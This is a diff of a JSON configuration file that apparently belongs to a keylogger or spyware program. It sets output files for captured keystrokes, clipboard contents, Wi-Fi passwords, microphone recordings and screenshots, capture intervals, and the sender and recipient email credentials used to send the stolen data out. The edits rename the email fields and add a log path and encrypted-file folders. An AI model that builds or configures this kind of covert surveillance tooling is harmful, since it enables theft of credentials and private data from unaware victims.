@@ -1,4 +1,6 @@
 {
+    "file_path" : "D:\\ProgramLogs",
+
     "keys_information" : "key_log.txt",
     "keys_send" : "key_send.txt",
     "system_information" : "systeminfo.txt",
@@ -7,22 +9,20 @@
     "audio_information" : "audio.wav",
     "screenshot_information" : "screenshot.png",
 
-
     "keys_send_e" : "e_keyinfo.txt",
     "system_information_e" : "e_systeminfo.txt",
     "clipboard_information_e" : "e_clipboard.txt",
     "wifi_information_e" : "e_wifi_passwords.txt",
 
     "microphone_time" : 10,
-    "time_iteration" : 15,
-    "number_of_iterations_end" : 3,
+    "time_iteration" : 60,
+    
+    "from_email" : "",
+    "password" : "",
+    
+    "to_email" : "",
 
-    "email_address" : " ",
-    "password" : " ",
-
-    "toaddr" : " ",
-
-    "key" : " ",
-
-    "file_path" : " "
+    "key" : "",
+    "encrypted_files_folder_path": "encrypted_files",
+    "decrypted_files_folder_path": "decrypted_files"
 }
